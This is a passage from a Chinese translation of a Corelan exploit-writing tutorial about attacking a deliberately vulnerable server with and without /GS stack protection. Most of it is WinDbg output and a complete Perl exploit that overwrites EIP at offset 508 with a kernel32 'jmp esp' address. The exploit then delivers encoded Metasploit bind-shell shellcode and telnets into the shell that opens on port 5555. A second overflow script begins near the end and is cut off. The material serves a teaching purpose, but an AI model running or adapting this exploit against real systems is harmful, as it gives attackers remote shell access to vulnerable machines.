（esp指向的内容“Stack around the variable ‘buf’ was corrupted”,它是VS2008 中RTC检查的
结果，可以通过在Visual Studio中禁用编译优化或者设置TRCu参数来禁止运行时检查，当然在正常情
况下，你不应该禁止它，因为它可以有效的阻止堆栈腐败。）
当你用lcc-win32编译原代码的时候（它没有编译保护，因此运行的时候很脆弱），在windbg中打开执
行文件（现在还没有启动），然后观察这个函数：
(82c.af4): Break instruction exception - code 80000003 (first chance)
eax=00241eb4 ebx=7ffd7000 ecx=00000005 edx=00000020 esi=00241f48 edi=00241eb4
eip=7c90120e esp=0012fb20 ebp=0012fc94 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
ntdll!DbgBreakPoint:
7c90120e cc int 3
0:000> uf pr
*** WARNING: Unable to verify checksum for c:\sploits\vulnsrv\\vulnsrv.exe
vulnsrv!pr:
004012d4 55 push ebp
004012d5 89e5 mov ebp,esp
004012d7 81ecf4010000 sub esp,1F4h
004012dd b97d000000 mov ecx,7Dh
vulnsrv!pr+0xe:
004012e2 49 dec ecx
004012e3 c7048c5a5afaff mov dword ptr [esp+ecx*4],0FFFA5A5Ah
004012ea 75f6 jne vulnsrv!pr+0xe (004012e2)
vulnsrv!pr+0x18:
004012ec 56 push esi
004012ed 57 push edi
004012ee 8dbd0cfeffff lea edi,[ebp-1F4h]
004012f4 8d35a0a04000 lea esi,[vulnsrv!main+0x8d6e (0040a0a0)]
004012fa b9f4010000 mov ecx,1F4h
004012ff f3a4 rep movs byte ptr es:[edi],byte ptr [esi]
00401301 ff7508 push dword ptr [ebp+8]
00401304 8dbd0cfeffff lea edi,[ebp-1F4h]
0040130a 57 push edi
0040130b e841300000 call vulnsrv!main+0x301f (00404351)
00401310 83c408 add esp,8
00401313 5f pop edi
00401314 5e pop esi
00401315 c9 leave
00401316 c3 ret
现在发送1000个字符到服务程序（没用/GS编译），它挂掉了。
(c60.cb0): Access violation - code c0000005 (!!! second chance !!!)
eax=0012e656 ebx=00000000 ecx=0012e44e edx=0012e600 esi=00000001 edi=00403388
eip=72413971 esp=0012e264 ebp=41387141 iopl=0 nv up ei pl zr na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246
72413971 ?? ???
0:000> !load byakugan
[Byakugan] Successfully loaded!
0:000> !pattern_offset 1000
[Byakugan] Control of ebp at offset 504.
[Byakugan] Control of eip at offset 508.
我们可以在508字节偏移的地方控制EIP，这时ESP指向我们的缓冲区:
0:000> d esp
0012e264 30 41 72 31 41 72 32 41-72 33 41 72 34 41 72 35 0Ar1Ar2Ar3Ar4Ar5
0012e274 41 72 36 41 72 37 41 72-38 41 72 39 41 73 30 41 Ar6Ar7Ar8Ar9As0A
0012e284 73 31 41 73 32 41 73 33-41 73 34 41 73 35 41 73 s1As2As3As4As5As
0012e294 36 41 73 37 41 73 38 41-73 39 41 74 30 41 74 31 6As7As8As9At0At1
0012e2a4 41 74 32 41 74 33 41 74-34 41 74 35 41 74 36 41 At2At3At4At5At6A
0012e2b4 74 37 41 74 38 41 74 39-41 75 30 41 75 31 41 75 t7At8At9Au0Au1Au
0012e2c4 32 41 75 33 41 75 34 41-75 35 41 75 36 41 75 37 2Au3Au4Au5Au6Au7
0012e2d4 41 75 38 41 75 39 41 76-30 41 76 31 41 76 32 41 Au8Au9Av0Av1Av2A
0:000> d
0012e2e4 76 33 41 76 34 41 76 35-41 76 36 41 76 37 41 76 v3Av4Av5Av6Av7Av
0012e2f4 38 41 76 39 41 77 30 41-77 31 41 77 32 41 77 33 8Av9Aw0Aw1Aw2Aw3
0012e304 41 77 34 41 77 35 41 77-36 41 77 37 41 77 38 41 Aw4Aw5Aw6Aw7Aw8A
0012e314 77 39 41 78 30 41 78 31-41 78 32 41 78 33 41 78 w9Ax0Ax1Ax2Ax3Ax
0012e324 34 41 78 35 41 78 36 41-78 37 41 78 38 41 78 39 4Ax5Ax6Ax7Ax8Ax9
0012e334 41 79 30 41 79 31 41 79-32 41 79 33 41 79 34 41 Ay0Ay1Ay2Ay3Ay4A
0012e344 79 35 41 79 36 41 79 37-41 79 38 41 79 39 41 7a y5Ay6Ay7Ay8Ay9Az
0012e354 30 41 7a 31 41 7a 32 41-7a 33 41 7a 34 41 7a 35 0Az1Az2Az3Az4Az5
0:000> d
0012e364 41 7a 36 41 7a 37 41 7a-38 41 7a 39 42 61 30 42 Az6Az7Az8Az9Ba0B
0012e374 61 31 42 61 32 42 61 33-42 61 34 42 61 35 42 61 a1Ba2Ba3Ba4Ba5Ba
0012e384 36 42 61 37 42 61 38 42-61 39 42 62 30 42 62 31 6Ba7Ba8Ba9Bb0Bb1
0012e394 42 62 32 42 62 33 42 62-34 42 62 35 42 62 36 42 Bb2Bb3Bb4Bb5Bb6B
0012e3a4 62 37 42 62 38 42 62 39-42 63 30 42 63 31 42 63 b7Bb8Bb9Bc0Bc1Bc
0012e3b4 32 42 63 33 42 63 34 42-63 35 42 63 36 42 63 37 2Bc3Bc4Bc5Bc6Bc7
0012e3c4 42 63 38 42 63 39 42 64-30 42 64 31 42 64 32 42 Bc8Bc9Bd0Bd1Bd2B
0012e3d4 64 33 42 64 34 42 64 35-42 64 36 42 64 37 42 64 d3Bd4Bd5Bd6Bd7Bd
（esp指向缓冲区的512字节偏移处）
$ ./pattern_offset.rb 0Ar1 1000
512
exploit：（利用kernel32.dll中的jmp esp指令地址：0×7C874413）
#
# Writing buffer overflows - Tutorial
# Peter Van Eeckhoutte
# http://www.corelan.be:8800
#
# Exploit for vulnsrv.c
#
#
print " --------------------------------------\n";
print " Writing Buffer Overflows\n";
print " Peter Van Eeckhoutte\n";
print " http://www.corelan.be:8800\n";
print " --------------------------------------\n";
print " Exploit for vulnsrv.c\n";
print " --------------------------------------\n";
use strict;
use Socket;
my $junk = "\x90" x 508;
#jmp esp (kernel32.dll)
my $eipoverwrite = pack('V',0x7C874413);
# windows/shell_bind_tcp - 702 bytes
# http://www.metasploit.com
# Encoder: x86/alpha_upper
# EXITFUNC=seh, LPORT=5555, RHOST=
my $shellcode="\x89\xe0\xd9\xd0\xd9\x70\xf4\x59\x49\x49\x49\x49\x49\x43" .
"\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56\x58" .
"\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42" .
"\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30" .
"\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x42\x4a" .
"\x4a\x4b\x50\x4d\x4d\x38\x4c\x39\x4b\x4f\x4b\x4f\x4b\x4f" .
"\x45\x30\x4c\x4b\x42\x4c\x51\x34\x51\x34\x4c\x4b\x47\x35" .
"\x47\x4c\x4c\x4b\x43\x4c\x43\x35\x44\x38\x45\x51\x4a\x4f" .
"\x4c\x4b\x50\x4f\x44\x58\x4c\x4b\x51\x4f\x47\x50\x43\x31" .
"\x4a\x4b\x47\x39\x4c\x4b\x46\x54\x4c\x4b\x43\x31\x4a\x4e" .
"\x50\x31\x49\x50\x4a\x39\x4e\x4c\x4c\x44\x49\x50\x42\x54" .
"\x45\x57\x49\x51\x48\x4a\x44\x4d\x45\x51\x48\x42\x4a\x4b" .
"\x4c\x34\x47\x4b\x46\x34\x46\x44\x51\x38\x42\x55\x4a\x45" .
"\x4c\x4b\x51\x4f\x51\x34\x43\x31\x4a\x4b\x43\x56\x4c\x4b" .
"\x44\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x43\x31\x4a\x4b" .
"\x44\x43\x46\x4c\x4c\x4b\x4b\x39\x42\x4c\x51\x34\x45\x4c" .
"\x45\x31\x49\x53\x46\x51\x49\x4b\x43\x54\x4c\x4b\x51\x53" .
"\x50\x30\x4c\x4b\x47\x30\x44\x4c\x4c\x4b\x42\x50\x45\x4c" .
"\x4e\x4d\x4c\x4b\x51\x50\x44\x48\x51\x4e\x43\x58\x4c\x4e" .
"\x50\x4e\x44\x4e\x4a\x4c\x46\x30\x4b\x4f\x4e\x36\x45\x36" .
"\x51\x43\x42\x46\x43\x58\x46\x53\x47\x42\x45\x38\x43\x47" .
"\x44\x33\x46\x52\x51\x4f\x46\x34\x4b\x4f\x48\x50\x42\x48" .
"\x48\x4b\x4a\x4d\x4b\x4c\x47\x4b\x46\x30\x4b\x4f\x48\x56" .
"\x51\x4f\x4c\x49\x4d\x35\x43\x56\x4b\x31\x4a\x4d\x45\x58" .
"\x44\x42\x46\x35\x43\x5a\x43\x32\x4b\x4f\x4e\x30\x45\x38" .
"\x48\x59\x45\x59\x4a\x55\x4e\x4d\x51\x47\x4b\x4f\x48\x56" .
"\x51\x43\x50\x53\x50\x53\x46\x33\x46\x33\x51\x53\x50\x53" .
"\x47\x33\x46\x33\x4b\x4f\x4e\x30\x42\x46\x42\x48\x42\x35" .
"\x4e\x53\x45\x36\x50\x53\x4b\x39\x4b\x51\x4c\x55\x43\x58" .
"\x4e\x44\x45\x4a\x44\x30\x49\x57\x46\x37\x4b\x4f\x4e\x36" .
"\x42\x4a\x44\x50\x50\x51\x50\x55\x4b\x4f\x48\x50\x45\x38" .
"\x49\x34\x4e\x4d\x46\x4e\x4a\x49\x50\x57\x4b\x4f\x49\x46" .
"\x46\x33\x50\x55\x4b\x4f\x4e\x30\x42\x48\x4d\x35\x51\x59" .
"\x4c\x46\x51\x59\x51\x47\x4b\x4f\x49\x46\x46\x30\x50\x54" .
"\x46\x34\x50\x55\x4b\x4f\x48\x50\x4a\x33\x43\x58\x4b\x57" .
"\x43\x49\x48\x46\x44\x39\x51\x47\x4b\x4f\x4e\x36\x46\x35" .
"\x4b\x4f\x48\x50\x43\x56\x43\x5a\x45\x34\x42\x46\x45\x38" .
"\x43\x53\x42\x4d\x4b\x39\x4a\x45\x42\x4a\x50\x50\x50\x59" .
"\x47\x59\x48\x4c\x4b\x39\x4d\x37\x42\x4a\x47\x34\x4c\x49" .
"\x4b\x52\x46\x51\x49\x50\x4b\x43\x4e\x4a\x4b\x4e\x47\x32" .
"\x46\x4d\x4b\x4e\x50\x42\x46\x4c\x4d\x43\x4c\x4d\x42\x5a" .
"\x46\x58\x4e\x4b\x4e\x4b\x4e\x4b\x43\x58\x43\x42\x4b\x4e" .
"\x48\x33\x42\x36\x4b\x4f\x43\x45\x51\x54\x4b\x4f\x48\x56" .
"\x51\x4b\x46\x37\x50\x52\x50\x51\x50\x51\x50\x51\x43\x5a" .
"\x45\x51\x46\x31\x50\x51\x51\x45\x50\x51\x4b\x4f\x4e\x30" .
"\x43\x58\x4e\x4d\x49\x49\x44\x45\x48\x4e\x46\x33\x4b\x4f" .
"\x48\x56\x43\x5a\x4b\x4f\x4b\x4f\x50\x37\x4b\x4f\x4e\x30" .
"\x4c\x4b\x51\x47\x4b\x4c\x4b\x33\x49\x54\x42\x44\x4b\x4f" .
"\x48\x56\x51\x42\x4b\x4f\x48\x50\x43\x58\x4a\x50\x4c\x4a" .
"\x43\x34\x51\x4f\x50\x53\x4b\x4f\x4e\x36\x4b\x4f\x48\x50" .
"\x41\x41";
my $nops="\x90" x 10;
# initialize host and port
my $host = shift || 'localhost';
my $port = shift || 200;
my $proto = getprotobyname('tcp');
# get the port address
my $iaddr = inet_aton($host);
my $paddr = sockaddr_in($port, $iaddr);
print "[+] Setting up socket\n";
# create the socket, connect to the port
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
print "[+] Connecting to $host on port $port\n";
connect(SOCKET, $paddr) or die "connect: $!";
print "[+] Sending payload\n";
print SOCKET $junk.$eipoverwrite.$nops.$shellcode."\n";
print "[+] Payload sent\n";
close SOCKET or die "close: $!";
system("telnet $host 5555\n");
好了，这个exploit在这里是可以工作的，因为这个程序没有启用/GS保护。
现在用同样的exploit攻击开启/GS后的程序版本：
程序挂掉了，exploit并没有成功。
在调试器中打开漏洞程序（开启GS），运行前在函数security_check_cookie上设置断点:
(b88.260): Break instruction exception - code 80000003 (first chance)
eax=00251eb4 ebx=7ffd7000 ecx=00000002 edx=00000004 esi=00251f48 edi=00251eb4 eip=7c90120e
esp=0012fb20 ebp=0012fc94 iopl=0
nv up ei pl nz na po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
ntdll!DbgBreakPoint:
7c90120e cc int 3
0:000> bp vulnerable_server!__security_check_cookie
0:000> bl
0 e 004012dd 0001 (0001) 0:**** vulnerable_server!__security_check_cookie
当溢出发生的时候堆栈到底发生了什么？
让我们观察下，当发送512个A到漏洞程序的时候会发生什么:
use strict;
use Socket;
my $junk = "\x41" x 512;
# initialize host and port
my $host = shift || 'localhost';
my $port = shift || 200;
my $proto = getprotobyname('tcp');